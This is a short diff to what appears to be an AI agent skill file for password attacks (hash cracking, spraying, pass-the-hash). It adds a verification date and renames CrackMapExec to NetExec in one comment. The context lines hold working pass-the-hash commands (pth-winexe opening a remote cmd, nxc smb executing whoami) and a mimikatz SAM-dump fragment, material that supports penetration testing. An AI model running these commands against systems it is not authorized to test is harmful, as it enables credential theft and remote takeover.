@@ -1,6 +1,7 @@
 ---
 name: cracking-passwords
 description: Crack password hashes using hashcat/john, perform password spraying, brute force authentication, and execute pass-the-hash attacks. Use when cracking credentials or performing password-based attacks.
+verified: 2026-07-27
 ---
 
 # Password Attacks and Credential Cracking Skill
@@ -337,7 +338,7 @@ lsadump::sam
 # pth-winexe
 pth-winexe -U domain/user%hash //10.10.10.10 cmd
 
-# crackmapexec
+# NetExec (nxc, formerly CrackMapExec)
 nxc smb 10.10.10.10 -u administrator -H 'hash' -x whoami
 
 # psexec.py
